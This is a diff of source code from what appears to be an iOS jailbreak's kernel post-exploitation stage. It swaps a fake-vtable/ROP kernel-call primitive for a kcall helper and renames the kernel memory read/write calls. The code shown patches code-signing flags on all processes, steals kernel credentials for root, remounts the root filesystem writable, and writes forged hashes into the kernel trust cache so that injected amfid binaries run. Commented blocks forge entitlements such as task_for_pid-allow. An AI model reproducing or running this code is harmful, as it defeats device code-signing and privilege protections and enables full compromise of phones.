@@ -7,6 +7,7 @@
 //
 
 #include "fun.h"
+#include "kcall.h"
 
 unsigned offsetof_p_pid = 0x10;               // proc_t::p_pid
 unsigned offsetof_task = 0x18;                // proc_t::task
@@ -54,40 +55,6 @@ char *itoa(long n)
 	return   buf;
 }
 
-
-const char* resourceInBundle(char* resource) {
-	char path[4096];
-	uint32_t size = sizeof(path);
-	_NSGetExecutablePath(path, &size);
-	char *pt = realpath(path, NULL);
-	
-	NSString *execpath = [[NSString stringWithUTF8String:pt] stringByDeletingLastPathComponent];
-	
-	NSString *bootstrap = [execpath stringByAppendingPathComponent:[NSString stringWithUTF8String:resource]];
-	return [bootstrap UTF8String];
-}
-
-uint64_t kexecute(mach_port_t user_client, uint64_t fake_client, uint64_t addr, uint64_t x0, uint64_t x1, uint64_t x2, uint64_t x3, uint64_t x4, uint64_t x5, uint64_t x6) {
-	// When calling IOConnectTrapX, this makes a call to iokit_user_client_trap, which is the user->kernel call (MIG). This then calls IOUserClient::getTargetAndTrapForIndex
-	// to get the trap struct (which contains an object and the function pointer itself). This function calls IOUserClient::getExternalTrapForIndex, which is expected to return a trap.
-	// This jumps to our gadget, which returns +0x40 into our fake user_client, which we can modify. The function is then called on the object. But how C++ actually works is that the
-	// function is called with the first arguement being the object (referenced as `this`). Because of that, the first argument of any function we call is the object, and everything else is passed
-	// through like normal.
-	
-	// Because the gadget gets the trap at user_client+0x40, we have to overwrite the contents of it
-	// We will pull a switch when doing so - retrieve the current contents, call the trap, put back the contents
-	// (i'm not actually sure if the switch back is necessary but meh)
-	
-	uint64_t offx20 = kread64(fake_client+0x40);
-	uint64_t offx28 = kread64(fake_client+0x48);
-	kwrite64(fake_client+0x40, x0);
-	kwrite64(fake_client+0x48, addr);
-	uint64_t returnval = iokit_user_client_trap(user_client, 0, (uint64_t)(x1), (uint64_t)(x2), (uint64_t)(x3), (uint64_t)(x4), (uint64_t)(x5), (uint64_t)(x6));
-	kwrite64(fake_client+0x40, offx20);
-	kwrite64(fake_client+0x48, offx28);
-	return returnval;
-}
-
 typedef struct {
 	uint64_t prev;
 	uint64_t next;
@@ -104,14 +71,13 @@ void let_the_fun_begin(mach_port_t tfp0, mach_port_t user_client) {
 	
 	dlopen(resourceInBundle("test.dylib"), RTLD_NOW);
 	
-	
 	// Get the slide
 	uint64_t slide = find_kernel_base() - 0xFFFFFFF007004000;
 	printf("[fun] slide: 0x%016llx\n", slide);
 	
 	kmap_hdr_t kernel_map;
 	
-	kread(kread64(0xFFFFFFF0075D5E20+slide)+0x10, &kernel_map, sizeof(kernel_map));
+	rkbuffer(rk64(0xFFFFFFF0075D5E20+slide)+0x10, &kernel_map, sizeof(kernel_map));
 
 	uint64_t zm_tmp;
 #   define ZM_FIX_ADDR(addr) \
@@ -119,53 +85,8 @@ void let_the_fun_begin(mach_port_t tfp0, mach_port_t user_client) {
 zm_tmp = (kernel_map.start & 0xffffffff00000000) | ((addr) & 0xffffffff), \
 zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
 )
-	
-	
-	
-	// From v0rtex - get the IOSurfaceRootUserClient port, and then the address of the actual client, and vtable
-	uint64_t IOSurfaceRootUserClient_port = find_port_address(user_client, MACH_MSG_TYPE_MAKE_SEND); // UserClients are just mach_ports, so we find its address
-	uint64_t IOSurfaceRootUserClient_addr = kread64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT)); // The UserClient itself (the C++ object) is at the kobject field
-	uint64_t IOSurfaceRootUserClient_vtab = kread64(IOSurfaceRootUserClient_addr); // vtables in C++ are at *object
-	
-	// The aim is to create a fake client, with a fake vtable, and overwrite the existing client with the fake one
-	// Once we do that, we can use IOConnectTrap6 to call functions in the kernel as the kernel
 
-	
-	// Create the vtable in the kernel memory, then copy the existing vtable into there
-	uint64_t fake_vtable = kalloc(0x1000);
-	printf("[fun] Created fake_vtable at %016llx\n", fake_vtable);
-	
-	for (int i = 0; i < 0x200; i++) {
-		kwrite64(fake_vtable+i*8, kread64(IOSurfaceRootUserClient_vtab+i*8));
-	}
-	
-	printf("[fun] Copied some of the vtable over\n");
-	
-	
-	// Create the fake user client
-	uint64_t fake_client = kalloc(0x1000);
-	printf("[fun] Created fake_client at %016llx\n", fake_client);
-	
-	for (int i = 0; i < 0x200; i++) {
-		kwrite64(fake_client+i*8, kread64(IOSurfaceRootUserClient_addr+i*8));
-	}
-	
-	printf("[fun] Copied the user client over\n");
-	
-	// Write our fake vtable into the fake user client
-	kwrite64(fake_client, fake_vtable);
-	
-	// Replace the user client with ours
-	kwrite64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), fake_client);
-	
-	// Now the userclient port we have will look into our fake user client rather than the old one
-	
-	// Replace IOUserClient::getExternalTrapForIndex with our ROP gadget (add x0, x0, #0x40; ret;)
-	kwrite64(fake_vtable+8*0xB7, find_add_x0_x0_0x40_ret());
-	
-	printf("[fun] Wrote the `add x0, x0, #0x40; ret;` gadget over getExternalTrapForIndex\n");
-	
-	#define kexecute(addr, x0, x1, x2, x3, x4, x5, x6) kexecute(user_client, fake_client, addr, (uint64_t)x0, (uint64_t)x1, (uint64_t)x2, (uint64_t)x3, (uint64_t)x4, (uint64_t)x5, (uint64_t)x6)
+    #define kexecute(addr, x0, x1, x2, x3, x4, x5, x6) kcall(addr, 7, x0, x1, x2, x3, x4, x6, x6)
 	
 	// Get our and the kernels struct proc from allproc
 	uint32_t our_pid = getpid();
@@ -174,11 +95,11 @@ zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
 	uint64_t container_proc = 0;
 	uint32_t amfid_pid = 0;
 	
-	uint64_t proc = kread64(find_allproc());
+	uint64_t proc = rk64(find_allproc());
 	while (proc) {
-		uint32_t pid = (uint32_t)kread32(proc + 0x10);
+		uint32_t pid = (uint32_t)rk32(proc + 0x10);
 		char name[40] = {0};
-		kread(proc+0x268, name, 20);
+		rkbuffer(proc+0x268, name, 20);
 		if (pid == our_pid) {
 			our_proc = proc;
 		} else if (pid == 0) {
@@ -187,55 +108,55 @@ zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
 			container_proc = proc;
 			amfid_pid = pid;
 //			printf("amfid's pid is %d", pid);
-//			uint64_t mac_pol = kread64(kread64(proc+0x100)+0x78);
+//			uint64_t mac_pol = rk64(rk64(proc+0x100)+0x78);
 //			//				printf("MAC policies for this process are at %016llx\n", mac_pol);
-//			uint64_t amfi_mac_pol = kread64(mac_pol+0x8); // This is actually an OSDictionary zz
+//			uint64_t amfi_mac_pol = rk64(mac_pol+0x8); // This is actually an OSDictionary zz
 //			//				printf("AMFI MAC policies at %016llx\n", amfi_mac_pol);
 //
-//			uint64_t str = kalloc(strlen("get-task-allow")+1);
-//			kwrite(str, "get-task-allow", strlen("get-task-allow"));
+//			uint64_t str = kmem_alloc(strlen("get-task-allow")+1);
+//			wkbuffer(str, "get-task-allow", strlen("get-task-allow"));
 //			uint64_t bol = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074A68C8+slide, 1, 0, 0, 0, 0, 0, 0));
-//			kexecute(kread64(kread64(amfi_mac_pol)+8*31), amfi_mac_pol, str, bol, 0, 0, 0, 0);
+//			kexecute(rk64(rk64(amfi_mac_pol)+8*31), amfi_mac_pol, str, bol, 0, 0, 0, 0);
 ////
-//			str = kalloc(strlen("dynamic-codesigning")+1);
-//			kwrite(str, "dynamic-codesigning", strlen("dynamic-codesigning"));
+//			str = kmem_alloc(strlen("dynamic-codesigning")+1);
+//			wkbuffer(str, "dynamic-codesigning", strlen("dynamic-codesigning"));
 //			bol = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074A68C8+slide, 1, 0, 0, 0, 0, 0, 0));
-//			kexecute(kread64(kread64(amfi_mac_pol)+8*31), amfi_mac_pol, str, bol, 0, 0, 0, 0);
+//			kexecute(rk64(rk64(amfi_mac_pol)+8*31), amfi_mac_pol, str, bol, 0, 0, 0, 0);
 			
 			
-//			uint32_t f = kread32(amfi_mac_pol+20); // Number of items in the dictionary
+//			uint32_t f = rk32(amfi_mac_pol+20); // Number of items in the dictionary
 //			//				printf("%d\n", f);
 //
 //
-//			uint64_t g = kread64(amfi_mac_pol+32); // Item buffer
+//			uint64_t g = rk64(amfi_mac_pol+32); // Item buffer
 //			//				printf("%016llx\n", g);
 //
 //			for (int i = 0; i < f; i++) {
-//				//					printf("%016llx\n", kread64(g+16*i)); // value is at this + 8
-//				printf("%016llx\n", kread64(kread64(g+16*i+8)));
-//				//					printf("%016llx\n", kread64(kread64(kread64(g+16*i)+0x10)));
+//				//					printf("%016llx\n", rk64(g+16*i)); // value is at this + 8
+//				printf("%016llx\n", rk64(rk64(g+16*i+8)));
+//				//					printf("%016llx\n", rk64(rk64(rk64(g+16*i)+0x10)));
 //
-//				size_t length = kexecute(0xFFFFFFF00709BDE0+slide, kread64(kread64(g+16*i)+0x10), 0, 0, 0, 0, 0, 0);
+//				size_t length = kexecute(0xFFFFFFF00709BDE0+slide, rk64(rk64(g+16*i)+0x10), 0, 0, 0, 0, 0, 0);
 //
 //				char* s = (char*)calloc(length+1, 1);
-//				kread(kread64(kread64(g+16*i)+0x10), s, length);
+//				rkbuffer(rk64(rk64(g+16*i)+0x10), s, length);
 //				printf("%s\n", s);
 //
 //			}
 		}
 		if (pid != 0) {
-			uint32_t csflags = kread32(proc + offsetof_p_csflags);
-			kwrite32(proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_VALID) & ~(CS_RESTRICT | CS_HARD));
+			uint32_t csflags = rk32(proc + offsetof_p_csflags);
+			wk32(proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW | CS_VALID) & ~(CS_RESTRICT | CS_HARD));
 		}
-		proc = kread64(proc);
+		proc = rk64(proc);
 	}
 	
 	printf("[fun] our proc is at 0x%016llx\n", our_proc);
 	printf("[fun] kern proc is at 0x%016llx\n", kern_proc);
 	
 	// Give us some special flags
-//	uint32_t csflags = kread32(our_proc + offsetof_p_csflags);
-//	kwrite32(our_proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD));
+//	uint32_t csflags = rk32(our_proc + offsetof_p_csflags);
+//	wk32(our_proc + offsetof_p_csflags, (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT | CS_HARD));
 	
 	// Properly copy the kernel's credentials so setuid(0) doesn't crash
 	uint64_t kern_ucred = 0;
@@ -275,18 +196,18 @@ zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
 	{
 		vm_offset_t off = 0xd8;
 		uint64_t _rootvnode = find_rootvnode();
-		uint64_t rootfs_vnode = kread64(_rootvnode);
-		uint64_t v_mount = kread64(rootfs_vnode + off);
-		uint32_t v_flag = kread32(v_mount + 0x71);
+		uint64_t rootfs_vnode = rk64(_rootvnode);
+		uint64_t v_mount = rk64(rootfs_vnode + off);
+		uint32_t v_flag = rk32(v_mount + 0x71);
 		
-		kwrite32(v_mount + 0x71, v_flag & ~(1 << 6));
+		wk32(v_mount + 0x71, v_flag & ~(1 << 6));
 		
 		char *nmz = strdup("/dev/disk0s1s1");
 		int rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
 		printf("[fun] remounting: %d\n", rv);
 		
-		v_mount = kread64(rootfs_vnode + off);
-		kwrite32(v_mount + 0x71, v_flag);
+		v_mount = rk64(rootfs_vnode + off);
+		wk32(v_mount + 0x71, v_flag);
 		
 		int fd = open("/.bit_of_fun", O_RDONLY);
 		if (fd == -1) {
@@ -308,8 +229,8 @@ zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
 		/* uncomment if you need to replace the binaries */
 		unlink("/fun_bins/inject_amfid");
 		unlink("/fun_bins/amfid_payload.dylib");
-//		unlink("/fun_bins/test.dylib");
-		
+        unlink("/fun_bins/test.dylib");
+
 		if (!file_exist("/fun_bins/inject_amfid")) {
 			cp(resourceInBundle("inject_amfid"), "/fun_bins/inject_amfid");
 			chmod("/fun_bins/inject_amfid", 777);
@@ -362,7 +283,7 @@ zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
 		 */
 		
 		uint64_t tc = find_trustcache();
-		printf("[fun] trust cache at: %016llx\n", kread64(tc));
+		printf("[fun] trust cache at: %016llx\n", rk64(tc));
 		
 		typedef char hash_t[20];
 		
@@ -375,7 +296,7 @@ zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
 		
 		struct trust_chain fake_chain;
 		
-		fake_chain.next = kread64(tc);
+		fake_chain.next = rk64(tc);
 		*(uint64_t *)&fake_chain.uuid[0] = 0xabadbabeabadbabe;
 		*(uint64_t *)&fake_chain.uuid[8] = 0xabadbabeabadbabe;
 		fake_chain.count = 2;
@@ -386,9 +307,9 @@ zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
 		memmove(fake_chain.hash[0], hash, 20);
 		memmove(fake_chain.hash[1], hash2, 20);
 		
-		uint64_t kernel_trust = kalloc(sizeof(fake_chain));
-		kwrite(kernel_trust, &fake_chain, sizeof(fake_chain));
-		kwrite64(tc, kernel_trust);
+		uint64_t kernel_trust = kmem_alloc(sizeof(fake_chain));
+		wkbuffer(kernel_trust, &fake_chain, sizeof(fake_chain));
+		wk64(tc, kernel_trust);
 		
 		printf("[fun] Wrote the signatures into the trust cache!\n");
 	}
@@ -409,13 +330,13 @@ zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
 	int tries = 3;
 	while (tries-- > 0) {
 		sleep(1);
-		uint64_t proc = kread64(find_allproc());
+		uint64_t proc = rk64(find_allproc());
 		while (proc) {
-			uint32_t pid = kread32(proc + offsetof_p_pid);
+			uint32_t pid = rk32(proc + offsetof_p_pid);
 			if (pid == pd) {
-				uint32_t csflags = kread32(proc + offsetof_p_csflags);
+				uint32_t csflags = rk32(proc + offsetof_p_csflags);
 				csflags = (csflags | CS_PLATFORM_BINARY | CS_INSTALLER | CS_GET_TASK_ALLOW) & ~(CS_RESTRICT  | CS_HARD);
-				kwrite32(proc + offsetof_p_csflags, csflags);
+				wk32(proc + offsetof_p_csflags, csflags);
 				tries = 0;
 				
 //				uint64_t self_ucred = 0;
@@ -426,27 +347,27 @@ zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
 //
 //
 //
-//				uint64_t mac_pol = kread64(self_ucred+0x78);
+//				uint64_t mac_pol = rk64(self_ucred+0x78);
 ////				printf("MAC policies for this process are at %016llx\n", mac_pol);
-//				uint64_t amfi_mac_pol = kread64(mac_pol+0x8); // This is actually an OSDictionary zz
+//				uint64_t amfi_mac_pol = rk64(mac_pol+0x8); // This is actually an OSDictionary zz
 ////				printf("AMFI MAC policies at %016llx\n", amfi_mac_pol);
 //
-//				uint32_t f = kread32(amfi_mac_pol+20); // Number of items in the dictionary
+//				uint32_t f = rk32(amfi_mac_pol+20); // Number of items in the dictionary
 ////				printf("%d\n", f);
 //
 //
-//				uint64_t g = kread64(amfi_mac_pol+32); // Item buffer
+//				uint64_t g = rk64(amfi_mac_pol+32); // Item buffer
 ////				printf("%016llx\n", g);
 //
 //				for (int i = 0; i < f; i++) {
-////					printf("%016llx\n", kread64(g+16*i)); // value is at this + 8
-//					printf("%016llx\n", kread64(kread64(g+16*i+8)));
-////					printf("%016llx\n", kread64(kread64(kread64(g+16*i)+0x10)));
+////					printf("%016llx\n", rk64(g+16*i)); // value is at this + 8
+//					printf("%016llx\n", rk64(rk64(g+16*i+8)));
+////					printf("%016llx\n", rk64(rk64(rk64(g+16*i)+0x10)));
 //
-//					size_t length = kexecute(0xFFFFFFF00709BDE0+slide, kread64(kread64(g+16*i)+0x10), 0, 0, 0, 0, 0, 0);
+//					size_t length = kexecute(0xFFFFFFF00709BDE0+slide, rk64(rk64(g+16*i)+0x10), 0, 0, 0, 0, 0, 0);
 //
 //					char* s = (char*)calloc(length+1, 1);
-//					kread(kread64(kread64(g+16*i)+0x10), s, length);
+//					rkbuffer(rk64(rk64(g+16*i)+0x10), s, length);
 //					printf("%s\n", s);
 //
 //				}
@@ -455,12 +376,12 @@ zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
 //
 //
 ////
-//				uint64_t str = kalloc(strlen("task_for_pid-allow")+1);
-//				kwrite(str, "task_for_pid-allow", strlen("task_for_pid-allow"));
-//				uint64_t getObject = kread64(kread64(amfi_mac_pol)+304);
+//				uint64_t str = kmem_alloc(strlen("task_for_pid-allow")+1);
+//				wkbuffer(str, "task_for_pid-allow", strlen("task_for_pid-allow"));
+//				uint64_t getObject = rk64(rk64(amfi_mac_pol)+304);
 //				uint64_t out = ZM_FIX_ADDR(kexecute(getObject, amfi_mac_pol, str, 0, 0, 0, 0, 0));
 //
-//				printf("%08x\n", kread32(out+0xc));
+//				printf("%08x\n", rk32(out+0xc));
 //
 ////				printf("%016llx\n", kexecute(slide+0xFFFFFFF00707FB58, out, 0, 0, 0, 0, 0, 0));
 ////
@@ -473,67 +394,67 @@ zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
 ////
 //
 //
-//				uint64_t bo = kalloc(8);
+//				uint64_t bo = kmem_alloc(8);
 //				kexecute(0xFFFFFFF00637D88C + slide, proc, str, bo, 0, 0, 0, 0);
-//				printf("hi - %016llx\n", kread64(bo));
+//				printf("hi - %016llx\n", rk64(bo));
 //
 //				uint64_t new_ent_dict = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074AAD50+slide, 4, 0, 0, 0, 0, 0, 0)); // OSDictionary::withCapacity
-//				printf("new_ent_dict - %016llx\n", kread64(new_ent_dict));
+//				printf("new_ent_dict - %016llx\n", rk64(new_ent_dict));
 //
 //				uint64_t symbol = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074C2D90+slide, str, 0, 0, 0, 0, 0, 0)); // OSSymbol::withCString
-//				printf("symbol - %016llx\n", kread64(symbol));
+//				printf("symbol - %016llx\n", rk64(symbol));
 //
 //				uint64_t bol = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074A68C8+slide, 1, 0, 0, 0, 0, 0, 0)); // OSBoolean::withBoolean
 ////																					 0x0000000012800000
-//				printf("bol - %016llx\n", kread64(bol));
+//				printf("bol - %016llx\n", rk64(bol));
 //				uint64_t bol2 = ZM_FIX_ADDR(kexecute(0xFFFFFFF0074A68C8+slide, 1, 0, 0, 0, 0, 0, 0));
 //
-//				uint64_t str2 = kalloc(strlen("com.apple.system-task-ports")+1);
-//				kwrite(str2, "com.apple.system-task-ports", strlen("com.apple.system-task-ports"));
+//				uint64_t str2 = kmem_alloc(strlen("com.apple.system-task-ports")+1);
+//				wkbuffer(str2, "com.apple.system-task-ports", strlen("com.apple.system-task-ports"));
 //
 //
-//				kexecute(kread64(kread64(new_ent_dict)+8*31), new_ent_dict, str, bol, 0, 0, 0, 0);
-//				kexecute(kread64(kread64(new_ent_dict)+8*31), new_ent_dict, str2, bol2, 0, 0, 0, 0);
-//				kwrite64(kread64(kern_ucred+0x78)+0x8, amfi_mac_pol);
+//				kexecute(rk64(rk64(new_ent_dict)+8*31), new_ent_dict, str, bol, 0, 0, 0, 0);
+//				kexecute(rk64(rk64(new_ent_dict)+8*31), new_ent_dict, str2, bol2, 0, 0, 0, 0);
+//				wk64(rk64(kern_ucred+0x78)+0x8, amfi_mac_pol);
 //
 //
-////				uint64_t vnode = kread64(proc+0x248);
-////				uint64_t off =kread64(proc+0x250);
+////				uint64_t vnode = rk64(proc+0x248);
+////				uint64_t off =rk64(proc+0x250);
 //
 //				uint64_t csblob = ZM_FIX_ADDR(kexecute(slide+0xFFFFFFF0073B717C, our_proc, 0, 0, 0, 0, 0, 0));
 //				printf("csblob - %016llx\n", csblob);
 //
 //				uint64_t dict = ZM_FIX_ADDR(kexecute(slide+0xFFFFFFF0073B71F4, csblob, 0, 0, 0, 0, 0, 0));
-//				printf("dict - %016llx - %016llx\n", dict, kread64(dict));
+//				printf("dict - %016llx - %016llx\n", dict, rk64(dict));
 //
-//				kexecute(kread64(kread64(dict)+8*31), dict, str, bol, 0, 0, 0, 0);
-//				kexecute(kread64(kread64(dict)+8*31), dict, str2, bol2, 0, 0, 0, 0);
+//				kexecute(rk64(rk64(dict)+8*31), dict, str, bol, 0, 0, 0, 0);
+//				kexecute(rk64(rk64(dict)+8*31), dict, str2, bol2, 0, 0, 0, 0);
 //
 //				kexecute(slide+0xFFFFFFF0073B7228, csblob, dict, 0, 0, 0, 0, 0);
 ////
-//				 f = kread32(dict+20); // Number of items in the dictionary
+//				 f = rk32(dict+20); // Number of items in the dictionary
 //				//				printf("%d\n", f);
 //
 //
-//				 g = kread64(dict+32); // Item buffer
+//				 g = rk64(dict+32); // Item buffer
 //				//				printf("%016llx\n", g);
 //
 //				for (int i = 0; i < f; i++) {
-//					//					printf("%016llx\n", kread64(g+16*i)); // value is at this + 8
-//					printf("%016llx\n", kread64(kread64(g+16*i+8)));
-//					//					printf("%016llx\n", kread64(kread64(kread64(g+16*i)+0x10)));
+//					//					printf("%016llx\n", rk64(g+16*i)); // value is at this + 8
+//					printf("%016llx\n", rk64(rk64(g+16*i+8)));
+//					//					printf("%016llx\n", rk64(rk64(rk64(g+16*i)+0x10)));
 //
-//					size_t length = kexecute(0xFFFFFFF00709BDE0+slide, kread64(kread64(g+16*i)+0x10), 0, 0, 0, 0, 0, 0);
+//					size_t length = kexecute(0xFFFFFFF00709BDE0+slide, rk64(rk64(g+16*i)+0x10), 0, 0, 0, 0, 0, 0);
 //
 //					char* s = (char*)calloc(length+1, 1);
-//					kread(kread64(kread64(g+16*i)+0x10), s, length);
+//					rkbuffer(rk64(rk64(g+16*i)+0x10), s, length);
 //					printf("%s\n", s);
 //
 //				}
 
 				break;
 			}
-			proc = kread64(proc);
+			proc = rk64(proc);
 		}
 	}
 
@@ -547,9 +468,8 @@ zm_tmp < kernel_map.start ? zm_tmp + 0x100000000 : zm_tmp \
 //	char *nmz = strdup("/dev/disk0s1s1");
 //	rv = mount("hfs", "/", MNT_UPDATE, (void *)&nmz);
 //	printf("[fun] remounting: %d\n", rv);
-	
-	kwrite64(IOSurfaceRootUserClient_port + koffset(KSTRUCT_OFFSET_IPC_PORT_IP_KOBJECT), IOSurfaceRootUserClient_addr);
-	kwrite64(kread64(kern_ucred+0x78)+0x8, 0);
+
+	wk64(rk64(kern_ucred+0x78)+0x8, 0);
 	term_kernel();
 	
 }
